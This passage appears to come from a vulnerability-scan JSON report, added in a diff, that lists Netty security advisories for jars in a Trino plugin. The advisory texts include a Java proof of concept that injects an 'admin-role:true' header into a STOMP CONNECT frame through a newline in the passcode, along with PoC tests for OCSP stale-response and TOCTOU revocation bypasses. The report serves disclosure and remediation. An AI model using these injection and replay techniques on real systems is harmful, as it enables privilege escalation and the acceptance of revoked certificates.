io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.embedded.EmbeddedChannel;\nimport io.netty.handler.codec.stomp.*;\n\nimport java.nio.charset.StandardCharsets;\n\n/**\n * PoC: STOMP CONNECT/CONNECTED Frame Header Injection Vulnerability\n *\n * Demonstrates that StompSubframeEncoder skips escape() for CONNECT and\n * CONNECTED commands, allowing \\n injection in header values to create\n * additional STOMP headers.\n */\npublic class StompConnectHeaderInjectionPoC {\n\n    public static void main(String[] args) {\n        System.out.println(\"=== Netty STOMP CONNECT Header Injection PoC ===\\n\");\n\n        testConnectHeaderInjection();\n        testConnectVsOtherCommand();\n\n        System.out.println(\"\\n=== PoC Complete ===\");\n    }\n\n    /**\n     * Test 1: CONNECT command header injection via \\n in value\n     */\n    static void testConnectHeaderInjection() {\n        System.out.println(\"[TEST 1] CONNECT Header Value Injection\");\n        System.out.println(\"-----------------------------------------\");\n\n        // Craft a CONNECT frame with \\n in passcode value\n        DefaultStompHeaders headers = new DefaultStompHeaders();\n        headers.set(StompHeaders.HOST, \"localhost\");\n        headers.set(StompHeaders.ACCEPT_VERSION, \"1.2\");\n        headers.set(StompHeaders.LOGIN, \"user\");\n        headers.set(StompHeaders.PASSCODE, \"password\\nadmin-role:true\");\n\n        DefaultStompFrame frame = new DefaultStompFrame(StompCommand.CONNECT);\n        frame.headers().setAll(headers);\n\n        EmbeddedChannel channel = new EmbeddedChannel(new StompSubframeEncoder());\n        channel.writeOutbound(frame);\n\n        ByteBuf output = channel.readOutbound();\n        String encoded = output.toString(StandardCharsets.UTF_8);\n        output.release();\n        channel.finishAndReleaseAll();\n\n        System.out.println(\"Input passcode: \\\"password\\\\nadmin-role:true\\\"\");\n        System.out.println();\n        System.out.println(\"Encoded STOMP frame:\");\n        System.out.println(\"---\");\n        // Show with visible control chars\n        for (String line : encoded.split(\"\\n\", -1)) {\n            System.out.println(\"  \" + line.replace(\"\\r\", \"\\\\r\").replace(\"\\0\", \"\\\\0\"));\n        }\n        System.out.println(\"---\");\n\n        // Check if the injected header appears as a separate line\n        boolean hasInjectedHeader = false;\n        String[] lines = encoded.split(\"\\n\");\n        for (String line : lines) {\n            if (line.startsWith(\"admin-role:\")) {\n                hasInjectedHeader = true;\n                break;\n            }\n        }\n\n        System.out.println();\n        System.out.println(\"Injected 'admin-role' appears as separate header: \" + hasInjectedHeader);\n        System.out.println(\"VULNERABLE: \" + (hasInjectedHeader ?\n            \"YES - Header injection in CONNECT frame!\" : \"NO\"));\n\n        // Count actual STOMP headers (lines between command and empty line)\n        int headerCount = 0;\n        boolean inHeaders = false;\n        for (String line : lines) {\n            if (line.equals(\"CONNECT\")) {\n                inHeaders = true;\n                continue;\n            }\n            if (inHeaders \u0026\u0026 line.trim().isEmpty()) break;\n            if (inHeaders \u0026\u0026 line.contains(\":\")) headerCount++;\n        }\n        System.out.println(\"Expected headers: 4 (host, accept-version, login, passcode)\");\n        System.out.println(\"Actual headers:   \" + headerCount);\n        System.out.println();\n    }\n\n    /**\n     * Test 2: Compare CONNECT (no escape) vs SEND (with escape)\n     */\n    static void testConnectVsOtherCommand() {\n        System.out.println(\"[TEST 2] CONNECT vs SEND Escape Comparison\");\n        System.out.println(\"--------------------------------------------\");\n\n        String maliciousValue = \"value\\ninjected:evil\";\n\n        // Test CONNECT (no escape)\n        {\n            DefaultStompHeaders headers = new DefaultStompHeaders();\n            headers.set(StompHeaders.HOST, \"localhost\");\n            headers.set(\"custom\", maliciousValue);\n\n            DefaultStompFrame frame = new DefaultStompFrame(StompCommand.CONNECT);\n            frame.headers().setAll(headers);\n            EmbeddedChannel channel = new EmbeddedChannel(new StompSubframeEncoder());\n            channel.writeOutbound(frame);\n\n            ByteBuf output = channel.readOutbound();\n            String encoded = output.toString(StandardCharsets.UTF_8);\n            output.release();\n            channel.finishAndReleaseAll();\n\n            System.out.println(\"CONNECT frame with custom=\\\"value\\\\ninjected:evil\\\":\");\n            System.out.println(\"  Encoded: \" + encoded.replace(\"\\n\", \"\\\\n\").replace(\"\\0\", \"\\\\0\"));\n\n            boolean hasRawNewline = encoded.contains(\"value\\ninjected:evil\");\n            System.out.println(\"  Raw \\\\n in output: \" + hasRawNewline);\n            System.out.println(\"  VULNERABLE: \" + (hasRawNewline ? \"YES\" : \"NO\"));\n        }\n\n        System.out.println();\n\n        // Test SEND (with escape)\n        {\n            DefaultStompHeaders headers = new DefaultStompHeaders();\n            headers.set(StompHeaders.DESTINATION, \"/queue/test\");\n            headers.set(\"custom\", maliciousValue);\n\n            DefaultStompFrame frame = new DefaultStompFrame(StompCommand.SEND);\n            frame.headers().setAll(headers);\n            EmbeddedChannel channel = new EmbeddedChannel(new StompSubframeEncoder());\n            channel.writeOutbound(frame);\n\n            ByteBuf output = channel.readOutbound();\n            String encoded = output.toString(StandardCharsets.UTF_8);\n            output.release();\n            channel.finishAndReleaseAll();\n\n            System.out.println(\"SEND frame with custom=\\\"value\\\\ninjected:evil\\\":\");\n            System.out.println(\"  Encoded: \" + encoded.replace(\"\\n\", \"\\\\n\").replace(\"\\0\", \"\\\\0\"));\n\n            boolean hasEscapedNewline = encoded.contains(\"value\\\\ninjected\\\\cevil\");\n            boolean hasRawNewline = encoded.contains(\"value\\ninjected:evil\");\n            System.out.println(\"  Escaped \\\\n: \" + hasEscapedNewline);\n            System.out.println(\"  Raw \\\\n:     \" + hasRawNewline);\n            System.out.println(\"  SAFE: \" + (hasEscapedNewline \u0026\u0026 !hasRawNewline ? \"YES\" : \"NO\"));\n        }\n        System.out.println();\n    }\n}\n```\n\n### How to Compile and Run\n\n```bash\n# Build Netty (skip tests for speed)\n./mvnw install -pl common,buffer,codec,codec-stomp,transport -DskipTests -Dcheckstyle.skip=true \\\n  -Denforcer.skip=true -Djapicmp.skip=true -Danimal.sniffer.skip=true \\\n  -Drevapi.skip=true -Dforbiddenapis.skip=true -Dspotbugs.skip=true -q\n\n# Set classpath\nJARS=$(find ~/.m2/repository/io/netty -name \"netty-*.jar\" -path \"*/4.2.12.Final/*\" \\\n  | grep -v sources | grep -v javadoc | tr '\\n' ':')\n\n# Compile and run\njavac -cp \"$JARS\" StompConnectHeaderInjectionPoC.java\njava -cp \"$JARS:.\" StompConnectHeaderInjectionPoC\n```\n\n### PoC Execution Output (Verified on Netty 4.2.12.Final)\n\n```\n=== Netty STOMP CONNECT Header Injection PoC ===\n\n[TEST 1] CONNECT Header Value Injection\n-----------------------------------------\nInput passcode: \"password\\nadmin-role:true\"\n\nEncoded STOMP frame:\n---\n  CONNECT\n  host:localhost\n  accept-version:1.2\n  login:user\n  passcode:password\n  admin-role:true          \u003c-- INJECTED HEADER\n\n  \\0\n---\n\nInjected 'admin-role' appears as separate header: true\nVULNERABLE: YES - Header injection in CONNECT frame!\nExpected headers: 4 (host, accept-version, login, passcode)\nActual headers:   5\n\n[TEST 2] CONNECT vs SEND Escape Comparison\n--------------------------------------------\nCONNECT frame with custom=\"value\\ninjected:evil\":\n  Encoded: CONNECT\\nhost:localhost\\ncustom:value\\ninjected:evil\\n\\n\\0\n  Raw \\n in output: true\n  VULNERABLE: YES\n\nSEND frame with custom=\"value\\ninjected:evil\":\n  Encoded: SEND\\ndestination:/queue/test\\ncustom:value\\ninjected\\cevil\\n\\n\\0\n  Escaped \\n: true\n  Raw \\n:     false\n  SAFE: YES\n\n\n=== PoC Complete ===\n```\n\n### Key Observation\n\nThe PoC demonstrates a clear inconsistency:\n- **CONNECT** command: `\\n` is written **raw** → header injection succeeds\n- **SEND** command: `\\n` is escaped to `\\\\n` → header injection prevented\n\n## 7. Impact Analysis\n\n| Impact Category | Description |\n|----------------|-------------|\n| **Authentication** | Injected headers may bypass broker authentication logic |\n| **Authorization** | Role escalation via injected role/permission headers |\n| **Integrity** | Modification of connection parameters (host, version, etc.) |\n| **Broker-Specific** | Impact varies by STOMP broker implementation (RabbitMQ, ActiveMQ, etc.) |\n\n### Affected Brokers\n\nThis vulnerability affects any application using Netty's STOMP encoder to communicate with STOMP brokers. The actual exploitability depends on the broker's handling of unexpected headers:\n\n- **RabbitMQ**: Uses specific headers for authentication; additional headers are typically ignored but may affect plugins\n- **ActiveMQ**: May process custom headers for internal routing\n- **Custom Brokers**: Most likely to be affected if they trust all received headers\n\n## 8. Remediation Recommendations\n\n### Option 1: Validate CONNECT Header Values (Recommended)\n\nAdd newline validation for CONNECT/CONNECTED frames instead of skipping escaping entirely:\n\n```java\nprivate static void encodeHeaders(StompHeadersSubframe frame, ByteBuf buf) {\n    StompCommand command = frame.command();\n    ByteBufUtil.writeUtf8(buf, command.toString());\n    buf.writeByte(StompConstants.LF);\n\n    boolean shouldEscape = shouldEscape(command);\n    for (Entry\u003cCharSequence, CharSequence\u003e entry : frame.headers()) {\n        CharSequence headerKey = entry.getKey();\n        CharSequence headerValue = entry.getValue();\n\n        if (shouldEscape) {\n            headerKey = escape(headerKey);\n            headerValue = escape(headerValue);\n        } else {\n            // For CONNECT/CONNECTED: don't escape but REJECT newlines\n            validateNoNewlines(headerKey, \"header name\");\n            validateNoNewlines(headerValue, \"header value\");\n        }\n\n        ByteBufUtil.writeUtf8(buf, headerKey);\n        buf.writeByte(StompConstants.COLON);\n        ByteBufUtil.writeUtf8(buf, headerValue);\n        buf.writeByte(StompConstants.LF);\n    }\n    buf.writeByte(StompConstants.LF);\n}\n\nprivate static void validateNoNewlines(CharSequence value, String type) {\n    for (int i = 0; i \u003c value.length(); i++) {\n        char c = value.charAt(i);\n        if (c == '\\n' || c == '\\r') {\n            throw new IllegalArgumentException(\n                \"STOMP CONNECT \" + type + \" contains illegal newline at index \" + i);\n        }\n    }\n}\n```\n\n### Option 2: Apply Escaping to All Commands\n\nSimply remove the CONNECT/CONNECTED exception:\n\n```java\nprivate static boolean shouldEscape(StompCommand command) {\n    return true; // Always escape\n}\n```\n\nNote: This may break compatibility with STOMP 1.0 clients, but is the most secure approach.\n\n## 9. References\n\n- [STOMP 1.2 Specification](https://stomp.github.io/stomp-specification-1.2.html)\n- [STOMP 1.2 Section 10: Value Encoding](https://stomp.github.io/stomp-specification-1.2.html#Value_Encoding)\n- [CWE-93: Improper Neutralization of CRLF Sequences](https://cwe.mitre.org/data/definitions/93.html)\n- [GHSA-jq43-27x9-3v86: Netty SMTP Command Injection (similar pattern)](https://github.com/netty/netty/security/advisories/GHSA-jq43-27x9-3v86)",
+          "Severity": "MEDIUM",
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 6.5
+            }
+          },
+          "References": [
+            "https://github.com/netty/netty",
+            "https://github.com/netty/netty/releases/tag/netty-4.1.136.Final",
+            "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
+            "https://github.com/netty/netty/security/advisories/GHSA-3g8r-4pfx-jmfh"
+          ]
+        },
+        {
+          "VulnerabilityID": "CVE-2026-56817",
+          "VendorIDs": [
+            "GHSA-4qhr-g3c6-fcfx"
+          ],
+          "PkgName": "io.netty:netty-codec-xml",
+          "PkgPath": "usr/lib/trino/plugin/delta-lake/io.netty_netty-codec-xml-4.2.15.Final.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/io.netty/netty-codec-xml@4.2.15.Final",
+            "UID": "88aa095276a51c5c"
+          },
+          "InstalledVersion": "4.2.15.Final",
+          "FixedVersion": "4.2.16.Final, 4.1.136.Final",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:5ba227191e2ccb69fd3e721140ad7b75a7dabd93a765d4b35ae51536f53704f2",
+            "DiffID": "sha256:827c0a06880845cf0f9042950ad5e3b8e4224829f033400b86c67ed5236020a4"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-56817",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:23dae922b0030bd2a0a30cabb2c6cd7655cba6c33961516072f6555d0d87810d",
+          "Title": "Netty XML: Injection / Risky Sink — unconfigured XML factory with active DTD and entity handling",
+          "Description": "Netty is a network application framework for development of protocol servers and clients. In versions 4.2.0.Final through 4.2.15.Final and 4.1.0.Final through 4.1.135.Final, any caller that can deliver bytes to a Netty channel pipeline containing `XmlDecoder` can send XML with a `DOCTYPE` declaration to an `AsyncXMLInputFactory` instantiated with no security configuration, leaving DTD and entity handling active depending on Aalto XML async parser behavior and creating conditional XML external entity risk. This issue is fixed in versions 4.1.136.Final and 4.2.16.Final.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-611"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:L/SC:N/SI:N/SA:N",
+              "V40Score": 8.3
+            }
+          },
+          "References": [
+            "https://github.com/netty/netty",
+            "https://github.com/netty/netty/commit/5b68c61f37aa4a3045cba624cbea239655c9003b",
+            "https://github.com/netty/netty/commit/bb2ff68a1fb71cb4b0eb9a9e17b66c52aff680c6",
+            "https://github.com/netty/netty/releases/tag/netty-4.1.136.Final",
+            "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
+            "https://github.com/netty/netty/security/advisories/GHSA-4qhr-g3c6-fcfx",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-56817"
+          ],
+          "PublishedDate": "2026-07-21T23:17:52.127Z",
+          "LastModifiedDate": "2026-07-22T20:35:40.827Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-56820",
+          "VendorIDs": [
+            "GHSA-272m-gcwp-mpwg"
+          ],
+          "PkgName": "io.netty:netty-handler-ssl-ocsp",
+          "PkgPath": "usr/lib/trino/plugin/delta-lake/io.netty_netty-handler-ssl-ocsp-4.2.15.Final.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/io.netty/netty-handler-ssl-ocsp@4.2.15.Final",
+            "UID": "8420b330fa585cab"
+          },
+          "InstalledVersion": "4.2.15.Final",
+          "FixedVersion": "4.2.16.Final, 4.1.136.Final",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:5ba227191e2ccb69fd3e721140ad7b75a7dabd93a765d4b35ae51536f53704f2",
+            "DiffID": "sha256:827c0a06880845cf0f9042950ad5e3b8e4224829f033400b86c67ed5236020a4"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-56820",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:45061bf1e08c3627e4f08ddc9299905e5a5e9490198a5eadd75bb8228c46a4b8",
+          "Title": "Netty: Missing CertificateID Validation in OCSP Response Allows Replay Attacks",
+          "Description": "Netty is a network application framework for development of protocol servers and clients. In versions 4.2.0.Final through 4.2.15.Final and prior to 4.1.135.Final, `OcspClient` does not validate that the `CertificateID` in an OCSP response matches the requested `CertificateID`, which can lead to replay attack. `OcspClient.validateResponse` accepts a legitimately signed `GOOD` status response for an unrelated certificate issued by the same CA, allowing bypass of revocation checks for another certificate. This issue is fixed in versions 4.1.136.Final and 4.2.16.Final.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-295"
+          ],
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            }
+          },
+          "References": [
+            "https://github.com/netty/netty",
+            "https://github.com/netty/netty/commit/5b68c61f37aa4a3045cba624cbea239655c9003b",
+            "https://github.com/netty/netty/commit/bb2ff68a1fb71cb4b0eb9a9e17b66c52aff680c6",
+            "https://github.com/netty/netty/releases/tag/netty-4.1.136.Final",
+            "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
+            "https://github.com/netty/netty/security/advisories/GHSA-272m-gcwp-mpwg",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-56820"
+          ],
+          "PublishedDate": "2026-07-21T23:17:52.403Z",
+          "LastModifiedDate": "2026-07-22T20:35:40.827Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-56821",
+          "VendorIDs": [
+            "GHSA-g7hg-vrcf-mvmr"
+          ],
+          "PkgName": "io.netty:netty-handler-ssl-ocsp",
+          "PkgPath": "usr/lib/trino/plugin/delta-lake/io.netty_netty-handler-ssl-ocsp-4.2.15.Final.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/io.netty/netty-handler-ssl-ocsp@4.2.15.Final",
+            "UID": "8420b330fa585cab"
+          },
+          "InstalledVersion": "4.2.15.Final",
+          "FixedVersion": "4.2.16.Final, 4.1.136.Final",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:5ba227191e2ccb69fd3e721140ad7b75a7dabd93a765d4b35ae51536f53704f2",
+            "DiffID": "sha256:827c0a06880845cf0f9042950ad5e3b8e4224829f033400b86c67ed5236020a4"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-56821",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:10a004cff88864983cdb82993ba7b03596cc6c4dbb9f37f25d2e4f7e70c40794",
+          "Title": "Netty: Out-of-date OCSP Responses Accepted by OcspServerCertificateValidator",
+          "Description": "### Summary\n`OcspServerCertificateValidator` flags an out-of-date OCSP response but does not stop processing it, so an expired GOOD response is still reported as `VALID`, letting an on-path attacker replay a stale GOOD response to bypass revocation of a since-revoked certificate.\n\n### Details\nIn `io.netty.handler.ssl.ocsp.OcspServerCertificateValidator#userEventTriggered` the freshness check has no `return`, so execution falls through and a `VALID` `OcspValidationEvent` is still fired:\n\n```java\n                        if (!(current.after(response.getThisUpdate()) \u0026\u0026\n                                current.before(response.getNextUpdate()))) {\n                            ctx.fireExceptionCaught(new IllegalStateException(\"OCSP Response is out-of-date\"));\n                        }\n```\n\nNonce validation is optional and off by default, so freshness is the only replay defense — and it is not enforced. Additionally `getNextUpdate()` may be `null`, making `current.before(null)` throw `NullPointerException`.\n\nhttps://datatracker.ietf.org/doc/html/rfc6960#section-3.2\n\n```\n   5. The time at which the status being indicated is known to be\n      correct (thisUpdate) is sufficiently recent;\n\n   6. When available, the time at or before which newer information will\n      be available about the status of the certificate (nextUpdate) is\n      greater than the current time.\n```\n\n### PoC\n\nAdd the test below to `io.netty.handler.ssl.ocsp.OcspServerCertificateValidatorTest`\n\n```java\n    @Test\n    void staleOcspResponseIsRejected() throws Exception {\n        X509Bundle caRoot = new CertificateBuilder()\n                .algorithm(CertificateBuilder.Algorithm.rsa2048)\n                .subject(\"CN=TrustedRootCA\")\n                .setIsCertificateAuthority(true)\n                .buildSelfSigned();\n\n        GeneralName ocspName = new GeneralName(GeneralName.uniformResourceIdentifier, \"http://localhost/\");\n        AuthorityInformationAccess aia = new AuthorityInformationAccess(\n                new AccessDescription(AccessDescription.id_ad_ocsp, ocspName));\n        X509Bundle targetCert = new CertificateBuilder()\n                .algorithm(CertificateBuilder.Algorithm.rsa2048)\n                .subject(\"CN=TargetServer\")\n                .addExtensionOctetString(\"1.3.6.1.5.5.7.1.1\", false, aia.getEncoded())\n                .buildIssuedBy(caRoot);\n\n        Date past = new Date(System.currentTimeMillis() - TimeUnit.DAYS.toMillis(7));\n        CertificateID certId = new CertificateID(\n                new JcaDigestCalculatorProviderBuilder().build().get(CertificateID.HASH_SHA1),\n                new JcaX509CertificateHolder(caRoot.getCertificate()),\n                targetCert.getCertificate().getSerialNumber());\n        BasicOCSPRespBuilder respBuilder = new BasicOCSPRespBuilder(\n                new RespID(new JcaX509CertificateHolder(caRoot.getCertificate()).getSubject()));\n        respBuilder.addResponse(certId, CertificateStatus.GOOD, past, past);\n        BasicOCSPResp expiredBasicResp = respBuilder.build(\n                new JcaContentSignerBuilder(\"SHA256withRSA\").build(caRoot.getKeyPair().getPrivate()),\n                new X509CertificateHolder[0],\n                past);\n        final byte[] responseEncoded = new OCSPRespBuilder()\n                .build(OCSPRespBuilder.SUCCESSFUL, expiredBasicResp).getEncoded();\n\n        IoTransport defaultTransport = createDefaultTransport();\n        IoTransport mockTransport = IoTransport.create(defaultTransport.eventLoop(), () -\u003e {\n                NioSocketChannel channel = new NioSocketChannel();\n                channel.pipeline().addFirst(new ChannelOutboundHandlerAdapter() {\n                    @Override\n                    public void connect(ChannelHandlerContext ctx, SocketAddress remoteAddress,\n                                        SocketAddress localAddress, ChannelPromise promise) {\n                        promise.setSuccess();\n                        ctx.executor().execute(() -\u003e {\n                            ctx.pipeline().fireChannelActive();\n                            DefaultFullHttpResponse httpResponse = new DefaultFullHttpResponse(\n                                    HttpVersion.HTTP_1_1, HttpResponseStatus.OK,\n                                    Unpooled.wrappedBuffer(responseEncoded));\n                            httpResponse.headers().set(HttpHeaderNames.CONTENT_TYPE, \"application/ocsp-response\");\n                            httpResponse.headers().set(HttpHeaderNames.CONTENT_LENGTH,\n                                    httpResponse.content().readableBytes());\n                            ctx.pipeline().fireChannelRead(httpResponse);\n                        });\n                    }\n                });\n                return channel;\n            }, defaultTransport.datagramChannel());\n\n            SslContext serverSslCtx = SslContextBuilder\n                    .forServer(targetCert.getKeyPair().getPrivate(),\n                            targetCert.getCertificate(), caRoot.getCertificate())\n                    .build();\n            Channel serverChannel = new ServerBootstrap()\n                    .group(defaultTransport.eventLoop())\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer\u003cSocketChannel\u003e() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ch.pipeline().addLast(serverSslCtx.newHandler(ch.alloc()));\n                        }\n                    })\n                    .bind(0).sync().channel();\n\n            int serverPort = ((InetSocketAddress) serverChannel.localAddress()).getPort();\n\n            AtomicBoolean validEventFired = new AtomicBoolean();\n            AtomicReference\u003cThrowable\u003e caughtException = new AtomicReference\u003c\u003e();\n            CountDownLatch latch = new CountDownLatch(1);\n\n            DnsNameResolver resolver = OcspServerCertificateValidator.createDefaultResolver(mockTransport);\n            SslContext clientSslCtx = SslContextBuilder.forClient()\n                    .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                    .build();\n            new Bootstrap()\n                    .group(defaultTransport.eventLoop())\n                    .channel(NioSocketChannel.class)\n                    .handler(new ChannelInitializer\u003cSocketChannel\u003e() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ch.pipeline().addLast(clientSslCtx.newHandler(ch.alloc(), \"127.0.0.1\", serverPort));\n                            ch.pipeline().addLast(\n                                    new OcspServerCertificateValidator(true, false, mockTransport, resolver));\n                            ch.pipeline().addLast(new ChannelInboundHandlerAdapter() {\n                                @Override\n                                public void userEventTriggered(ChannelHandlerContext ctx, Object evt) {\n                                    if (evt instanceof OcspValidationEvent \u0026\u0026\n                                            ((OcspValidationEvent) evt).response().status() ==\n                                                    OcspResponse.Status.VALID) {\n                                        validEventFired.set(true);\n                                    }\n                                    ctx.fireUserEventTriggered(evt);\n                                }\n\n                                @Override\n                                public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n                                    caughtException.compareAndSet(null, cause);\n                                    ctx.channel().close();\n                                    latch.countDown();\n                                }\n                            });\n                        }\n                    })\n                    .connect(\"127.0.0.1\", serverPort).sync();\n\n            assertTrue(latch.await(5, TimeUnit.SECONDS));\n            assertFalse(validEventFired.get(),\n                    \"OcspValidationEvent(VALID) must not be emitted for a stale OCSP response\");\n            assertNotNull(caughtException.get());\n            assertInstanceOf(IllegalStateException.class, caughtException.get());\n\n            serverChannel.close().sync();\n            resolver.close();\n    }\n```\n### Impact\nCertificate revocation bypass via replay of an expired OCSP response. Any application using `OcspServerCertificateValidator` is affected; a revoked certificate can be accepted.",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+              "V3Score": 7.4
+            }
+          },
+          "References": [
+            "https://github.com/netty/netty",
+            "https://github.com/netty/netty/releases/tag/netty-4.1.136.Final",
+            "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
+            "https://github.com/netty/netty/security/advisories/GHSA-g7hg-vrcf-mvmr"
+          ]
+        },
+        {
+          "VulnerabilityID": "CVE-2026-56822",
+          "VendorIDs": [
+            "GHSA-wc96-39fc-566f"
+          ],
+          "PkgName": "io.netty:netty-handler-ssl-ocsp",
+          "PkgPath": "usr/lib/trino/plugin/delta-lake/io.netty_netty-handler-ssl-ocsp-4.2.15.Final.jar",
+          "PkgIdentifier": {
+            "PURL": "pkg:maven/io.netty/netty-handler-ssl-ocsp@4.2.15.Final",
+            "UID": "8420b330fa585cab"
+          },
+          "InstalledVersion": "4.2.15.Final",
+          "FixedVersion": "4.2.16.Final, 4.1.136.Final",
+          "Status": "fixed",
+          "Layer": {
+            "Digest": "sha256:5ba227191e2ccb69fd3e721140ad7b75a7dabd93a765d4b35ae51536f53704f2",
+            "DiffID": "sha256:827c0a06880845cf0f9042950ad5e3b8e4224829f033400b86c67ed5236020a4"
+          },
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-56822",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory Maven",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
+          },
+          "Fingerprint": "sha256:6b3941495bcb645de95400aa9f289b8c3a1047856c5eccf4d9a8a6b6b7440cbd",
+          "Title": "Netty: TOCTOU in OcspServerCertificateValidator",
+          "Description": "### Summary\nNetty's OcspServerCertificateValidator forwards the SslHandshakeCompletionEvent before the asynchronous OCSP validation completes. This allows the client's downstream handlers to send sensitive application data (e.g., HTTP requests) to a revoked server before the channel is closed by the OCSP check.\n\n### Details\nIn `io.netty.handler.ssl.ocsp.OcspServerCertificateValidator#userEventTriggered`, when an `SslHandshakeCompletionEvent` is received, the validator immediately calls `ctx.fireUserEventTriggered(evt)`. It then initiates an asynchronous OCSP query using `OcspClient.query`.\n\nBecause the handshake completion event is forwarded immediately, downstream handlers in the client's pipeline are notified that the TLS handshake is successful. They may then begin reading and processing incoming application data or sending outgoing data. If the OCSP response later indicates the server's certificate is REVOKED, the validator closes the channel, but by this time, the client may have already leaked sensitive data to a revoked server or processed malicious responses from it.\n\n### PoC\n\n```java\n    @Test\n    public void test() throws Exception {\n        EventLoopGroup group = new MultiThreadIoEventLoopGroup(NioIoHandler.newFactory());\n        try {\n            OCSPRespBuilder respBuilder = new OCSPRespBuilder();\n            OCSPResp response = respBuilder.build(OCSPRespBuilder.INTERNAL_ERROR, null);\n            byte[] responseEncoded = response.getEncoded();\n\n            IoTransport mockTransport = IoTransport.create(group.next(), () -\u003e {\n                NioSocketChannel channel = new NioSocketChannel();\n                channel.pipeline().addFirst(new ChannelOutboundHandlerAdapter() {\n                    @Override\n                    public void connect(ChannelHandlerContext ctx, SocketAddress remoteAddress, SocketAddress localAddress, ChannelPromise promise) {\n                        promise.setSuccess();\n\n                        ctx.executor().schedule(() -\u003e {\n                            ctx.pipeline().fireChannelActive();\n\n                            DefaultFullHttpResponse httpResponse = new DefaultFullHttpResponse(\n                                    HttpVersion.HTTP_1_1, HttpResponseStatus.OK, Unpooled.wrappedBuffer(responseEncoded));\n                            httpResponse.headers().set(HttpHeaderNames.CONTENT_TYPE, \"application/ocsp-response\");\n                            httpResponse.headers().set(HttpHeaderNames.CONTENT_LENGTH, httpResponse.content().readableBytes());\n\n                            ctx.pipeline().fireChannelRead(httpResponse);\n                        }, 500, TimeUnit.MILLISECONDS);\n                    }\n                });\n                return channel;\n            }, NioDatagramChannel::new);\n\n            X509Bundle caRoot = new CertificateBuilder()\n                    .algorithm(CertificateBuilder.Algorithm.rsa2048)\n                    .subject(\"CN=TrustedRootCA\")\n                    .setIsCertificateAuthority(true)\n                    .buildSelfSigned();\n\n            GeneralName ocspName = new GeneralName(GeneralName.uniformResourceIdentifier, \"http://localhost/\");\n            AuthorityInformationAccess aia = new AuthorityInformationAccess(new AccessDescription(AccessDescription.id_ad_ocsp, ocspName));\n            X509Bundle targetCert = new CertificateBuilder()\n                    .algorithm(CertificateBuilder.Algorithm.rsa2048)\n                    .subject(\"CN=TargetServer\")\n                    .addExtensionOctetString(\"1.3.6.1.5.5.7.1.1\", false, aia.getEncoded())\n                    .buildIssuedBy(caRoot);\n\n            SslContext serverSslCtx = SslContextBuilder.forServer(targetCert.getKeyPair().getPrivate(), targetCert.getCertificate()).build();\n\n            CopyOnWriteArrayList\u003cString\u003e receivedData = new CopyOnWriteArrayList\u003c\u003e();\n            CountDownLatch dataReceivedLatch = new CountDownLatch(1);\n\n            new ServerBootstrap()\n                    .group(group)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer\u003cSocketChannel\u003e() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ch.pipeline().addLast(serverSslCtx.newHandler(ch.alloc()));\n                            ch.pipeline().addLast(new SimpleChannelInboundHandler\u003cByteBuf\u003e() {\n                                @Override\n                                protected void channelRead0(ChannelHandlerContext ctx, ByteBuf msg) {\n                                    